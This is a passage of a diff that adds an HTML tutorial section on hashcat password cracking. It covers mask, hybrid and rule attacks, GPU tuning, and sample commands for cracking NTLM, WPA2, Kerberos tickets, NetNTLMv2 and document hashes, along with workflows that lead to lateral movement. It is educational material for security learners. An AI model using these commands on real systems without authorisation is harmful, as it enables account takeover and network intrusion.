+hashcat -m 0 -a 3 hashes.txt password?d?d<br><br>
+
+# 8-char alphanumeric (lowercase + digits):<br>
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?d?d?d?d<br><br>
+
+# Complex: Uppercase + 6 lowercase + 2 digits:<br>
+hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d<br><br>
+
+# Custom charset (only certain characters):<br>
+hashcat -m 0 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1<br>
+# -1 defines custom charset (?1 = lowercase + digits)<br><br>
+
+# Increment mode (try all lengths from 1 to N):<br>
+hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --increment --increment-min=1 --increment-max=8</div>
+            <p><strong>Performance Warning:</strong> Mask attacks are EXPONENTIALLY slow! ?l?l?l?l?l?l?l?l (8 lowercase) = 26^8 = 208 billion attempts. Only feasible for fast hashes (MD5, NTLM) or short passwords!</p>
+
+            <h5>Combination Attack</h5>
+            <div class="code">
+# Combine words from two wordlists:<br>
+hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt<br><br>
+
+# Example combinations:<br>
+# wordlist1.txt: super, mega, ultra<br>
+# wordlist2.txt: admin, user, password<br>
+# Results: superadmin, superuser, superpassword, megaadmin, etc.<br><br>
+
+# Useful for multi-word passwords like "dragonballz", "passwordadmin"</div>
+
+            <h5>Hybrid Attacks</h5>
+            <div class="code">
+# Hybrid Wordlist + Mask (-a 6):<br>
+# Append mask to wordlist words<br>
+hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d<br>
+# Tries: password00, password01, ..., password99, admin00, admin01, etc.<br><br>
+
+hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d<br>
+# Append 4 digits (password2024, admin2024, etc.)<br><br>
+
+# Hybrid Mask + Wordlist (-a 7):<br>
+# Prepend mask to wordlist words<br>
+hashcat -m 0 -a 7 hashes.txt ?d?d wordlist.txt<br>
+# Tries: 00password, 01password, 99password, 00admin, etc.</div>
+            <p><strong>Real-World Use:</strong> Passwords often follow patterns like "word+numbers" (password123, admin2024). Hybrid attacks target these patterns efficiently!</p>
+
+            <h5>Rule-Based Attacks</h5>
+            <div class="code">
+# Rules transform wordlist passwords (same as John the Ripper)<br>
+# Hashcat includes powerful rule files:<br><br>
+
+# Best64 (most effective 64 rules):<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule<br><br>
+
+# Common rule files (in /usr/share/hashcat/rules/):<br>
+best64.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Top 64 rules (RECOMMENDED for most attacks)<br>
+rockyou-30000.rule&nbsp;&nbsp;&nbsp;&nbsp;# 30,000 rules from RockYou breach analysis<br>
+dive.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 2,152,768 rules (VERY comprehensive)<br>
+d3ad0ne.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 34,555 rules<br>
+T0XlC.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 14,885 rules<br>
+leetspeak.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Leet speak transformations (a→@, e→3, etc.)<br>
+toggles1.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Toggle case variations<br><br>
+
+# Multiple rules (combined):<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule -r leetspeak.rule<br><br>
+
+# Generate rules to stdout (preview):<br>
+hashcat -a 0 --stdout wordlist.txt -r best64.rule | head -20</div>
+
+            <h5>Performance Options</h5>
+            <div class="code">
+# Workload profiles (-w flag):<br>
+-w 1&nbsp;&nbsp;# Low (minimal GPU usage, desktop usable)<br>
+-w 2&nbsp;&nbsp;# Default (balanced)<br>
+-w 3&nbsp;&nbsp;# High (heavy GPU usage, desktop may lag)<br>
+-w 4&nbsp;&nbsp;# Nightmare (maximum performance, desktop unusable)<br><br>
+
+# Example:<br>
+hashcat -m 1000 -a 0 -w 3 hashes.txt rockyou.txt<br><br>
+
+# Optimized kernels (-O flag):<br>
+hashcat -m 1000 -a 0 -O hashes.txt rockyou.txt<br>
+# Faster but limits password length (usually 32 chars max)<br><br>
+
+# Device selection (-d flag):<br>
+hashcat -d 1 -m 1000 -a 0 hashes.txt rockyou.txt&nbsp;&nbsp;# Use GPU 1 only<br>
+hashcat -d 1,2 -m 1000 -a 0 hashes.txt rockyou.txt&nbsp;&nbsp;# Use GPU 1 and 2<br><br>
+
+# Show devices:<br>
+hashcat -I&nbsp;&nbsp;# List available devices</div>
+
+            <h5>Output & Session Management</h5>
+            <div class="code">
+# Save cracked passwords:<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt<br><br>
+
+# Output format (--outfile-format):<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt --outfile-format=2<br>
+# Formats: 1=hash, 2=plain, 3=hash:plain, 4=hex, 5=plain:hex, etc.<br><br>
+
+# Session management (save progress):<br>
+hashcat -m 1000 -a 0 --session=mysession hashes.txt rockyou.txt<br><br>
+
+# Pause session (Ctrl+C or 'p' key)<br><br>
+
+# Resume session:<br>
+hashcat --session=mysession --restore<br><br>
+
+# Remove session files:<br>
+hashcat --session=mysession --remove</div>
+
+            <h5>Show Cracked Passwords</h5>
+            <div class="code">
+# Show cracked hashes (from potfile):<br>
+hashcat -m 1000 --show hashes.txt<br><br>
+
+# Potfile location:<br>
+~/.hashcat/hashcat.potfile&nbsp;&nbsp;# Linux/Mac<br>
+%APPDATA%\hashcat\hashcat.potfile&nbsp;&nbsp;# Windows<br><br>
+
+# Show only left (uncracked):<br>
+hashcat -m 1000 --show --left hashes.txt<br><br>
+
+# Custom potfile:<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-path=custom.pot</div>
+
+            <h5>Real-World Examples</h5>
+            <div class="code">
+# NTLM hashes (Windows) with rules:<br>
+hashcat -m 1000 -a 0 -w 3 ntlm.txt rockyou.txt -r best64.rule -O<br><br>
+
+# WPA/WPA2 handshake (PMKID attack):<br>
+# First convert with hcxpcapngtool:<br>
+hcxpcapngtool -o hash.hc22000 capture.pcapng<br>
+hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt<br><br>
+
+# Kerberoasting (Kerberos TGS):<br>
+hashcat -m 13100 -a 0 kerberos_tickets.txt rockyou.txt -r best64.rule<br><br>
+
+# AS-REP Roasting:<br>
+hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt<br><br>
+
+# ZIP file password:<br>
+# First extract hash with zip2john (or use 7z2hashcat)<br>
+hashcat -m 11600 -a 0 zip_hash.txt rockyou.txt<br><br>
+
+# PDF password:<br>
+hashcat -m 10500 -a 0 pdf_hash.txt rockyou.txt<br><br>
+
+# MS Office document:<br>
+hashcat -m 9600 -a 0 office_hash.txt rockyou.txt&nbsp;&nbsp;# Office 2013<br><br>
+
+# NetNTLMv2 (captured with Responder):<br>
+hashcat -m 5600 -a 0 netntlmv2.txt rockyou.txt<br><br>
+
+# bcrypt (Linux /etc/shadow):<br>
+hashcat -m 3200 -a 0 -w 3 bcrypt_hashes.txt rockyou.txt<br>
+# WARNING: bcrypt is VERY slow even on GPU!</div>
+
+            <h5>Benchmark Your GPU</h5>
+            <div class="code">
+# Full benchmark (all algorithms):<br>
+hashcat -b<br><br>
+
+# Benchmark specific hash mode:<br>
+hashcat -b -m 1000&nbsp;&nbsp;# NTLM benchmark<br>
+hashcat -b -m 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MD5 benchmark<br>
+hashcat -b -m 22000&nbsp;&nbsp;# WPA2 benchmark<br><br>
+
+# Example output (RTX 3090):<br>
+# MD5: 100 GH/s (100 billion hashes/second!)<br>
+# NTLM: 160 GH/s<br>
+# bcrypt: 150 kH/s (slow!)<br>
+# WPA2: 1.5 MH/s</div>
+
+            <h5>Hashcat Utils (Companion Tools)</h5>
+            <div class="code">
+# Combinator (combine two wordlists):<br>
+combinator.bin wordlist1.txt wordlist2.txt > combined.txt<br><br>
+
+# Maskprocessor (generate candidates from mask):<br>
+mp64.bin ?l?l?l?l?l?l > 6char_lowercase.txt<br><br>
+
+# Princeprocessor (PRINCE algorithm - advanced wordlist generation):<br>
+pp64.bin < wordlist.txt > prince_candidates.txt<br><br>
+
+# Kwprocessor (keyboard walk generator - qwerty123, etc.):<br>
+kwp64.bin basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route<br><br>
+
+# Statsprocessor (Markov chains for password generation):<br>
+sp64.bin --markov-hcstat2 hashcat.hcstat2 ?l?l?l?l?l?l?l?l</div>
+
+            <div class="metaphor-box">
+                <p><strong>🚀 Hashcat Mastery Summary:</strong></p>
+                <p><strong>Essential Commands:</strong><br>
+                • <strong>NTLM (Windows):</strong> <code>hashcat -m 1000 -a 0 -w 3 ntlm.txt rockyou.txt -r best64.rule -O</code><br>
+                • <strong>Linux SHA-512:</strong> <code>hashcat -m 1800 -a 0 shadow.txt rockyou.txt -r best64.rule</code><br>
+                • <strong>WPA2 handshake:</strong> <code>hashcat -m 22000 -a 0 handshake.hc22000 rockyou.txt</code><br>
+                • <strong>Kerberoasting:</strong> <code>hashcat -m 13100 -a 0 tickets.txt rockyou.txt -r best64.rule</code><br>
+                • <strong>Mask (8-char lowercase):</strong> <code>hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l</code><br>
+                • <strong>Hybrid (word+2 digits):</strong> <code>hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d</code><br>
+                • <strong>Show cracked:</strong> <code>hashcat -m 1000 --show ntlm.txt</code><br>
+                • <strong>Benchmark GPU:</strong> <code>hashcat -b</code><br><br>
+                
+                <strong>Critical Flags:</strong><br>
+                • <code>-m MODE</code>: Hash type (0=MD5, 1000=NTLM, 1800=SHA512, 22000=WPA2, 13100=Kerberos TGS)<br>
+                • <code>-a MODE</code>: Attack (0=Straight, 1=Combination, 3=Mask, 6=Hybrid wordlist+mask, 7=Hybrid mask+wordlist)<br>
+                • <code>-w 3</code>: High workload (max GPU usage)<br>
+                • <code>-O</code>: Optimized kernels (MUCH faster, limits password length to 32 chars)<br>
+                • <code>-r RULE</code>: Apply rule file (best64.rule recommended)<br>
+                • <code>-o FILE</code>: Output cracked passwords<br>
+                • <code>--session</code> / <code>--restore</code>: Save/resume progress<br>
+                • <code>--show</code>: Display already cracked passwords<br><br>
+                
+                <strong>Attack Strategy:</strong><br>
+                1. <strong>Wordlist + Rules:</strong> <code>-a 0 rockyou.txt -r best64.rule</code> (most effective!)<br>
+                2. <strong>Hybrid attacks:</strong> <code>-a 6 wordlist.txt ?d?d</code> (append 2 digits)<br>
+                3. <strong>Mask attack:</strong> <code>-a 3 ?l?l?l?l?d?d?d?d</code> (for short, known patterns)<br>
+                4. <strong>Combination:</strong> <code>-a 1 list1.txt list2.txt</code> (for multi-word passwords)<br><br>
+                
+                <strong>Performance Optimization:</strong><br>
+                • Use <code>-w 3</code> or <code>-w 4</code> for maximum GPU utilization<br>
+                • Add <code>-O</code> flag for optimized kernels (2-4x faster!)<br>
+                • Use best64.rule (not dive.rule) for balance of speed vs coverage<br>
+                • Check GPU utilization: <code>nvidia-smi</code> (should be 95-100%)<br>
+                • Fast hashes (MD5, NTLM): billions/sec. Slow hashes (bcrypt, WPA2): thousands/sec<br><br>
+                
+                <strong>Hash Speeds (RTX 3090):</strong><br>
+                MD5 (0): 100 GH/s | NTLM (1000): 160 GH/s | SHA1 (100): 50 GH/s | SHA512 (1800): 1 GH/s | bcrypt (3200): 150 kH/s | WPA2 (22000): 1.5 MH/s | Kerberos TGS (13100): 700 MH/s<br><br>
+                
+                <strong>Real-World Workflows:</strong><br>
+                • <strong>Windows pentesting:</strong> secretsdump.py → Extract NTLM → Hashcat cracking → Lateral movement<br>
+                • <strong>WiFi cracking:</strong> Capture handshake (hcxdumptool) → Convert (hcxpcapngtool) → Crack (hashcat -m 22000)<br>
+                • <strong>Kerberoasting:</strong> GetUserSPNs.py → Dump TGS tickets → Crack (hashcat -m 13100) → Service account compromise<br>
+                • <strong>NetNTLMv2 relay:</strong> Responder captures → Crack (hashcat -m 5600) → SMB authentication<br><br>
+                
+                <strong>John vs Hashcat:</strong><br>
+                • <strong>John:</strong> CPU-based, better for slow hashes (bcrypt), has xxx2john converters, easier for beginners<br>
+                • <strong>Hashcat:</strong> GPU-based, 100-1000x faster for fast hashes (MD5, NTLM, SHA), essential for large password dumps<br>
+                • <strong>Use Both:</strong> John for format conversion (zip2john, ssh2john), Hashcat for actual cracking! 💻⚡</p>
             </div>
 
         </section>
